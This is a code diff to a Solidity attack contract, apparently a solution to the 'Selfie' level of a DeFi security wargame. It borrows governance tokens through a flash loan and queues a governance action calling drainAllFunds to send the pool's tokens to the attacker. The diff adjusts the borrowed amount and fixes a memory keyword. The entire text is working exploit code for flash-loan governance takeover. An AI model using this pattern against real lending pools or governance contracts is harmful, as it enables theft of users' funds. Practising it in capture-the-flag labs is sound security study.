@@ -32,13 +32,16 @@ contract AttackContract {
 
     function attack() public {
         require(msg.sender == owner, "Not owner");
-        uint256 halfTheSupply = dvtSnapshot.totalSupply() / 2;
+        uint256 halfTheSupply = dvtSnapshot.balanceOf(address(selfiePool)) - 1;
         selfiePool.flashLoan(halfTheSupply);
     }
 
     function receiveTokens(address _dvtSnapshot, uint256 borrowAmount) public {
         require(msg.sender == address(selfiePool), "Not Pool");
-        bytes data = abi.encodeWithSignature("drainAllFunds(address)", owner);
+        bytes memory data = abi.encodeWithSignature(
+            "drainAllFunds(address)",
+            owner
+        );
         uint256 amount = dvtSnapshot.balanceOf(address(selfiePool));
         uint256 _actionId = simpleGovernance.queueAction(owner, data, amount);
         actionId = _actionId;
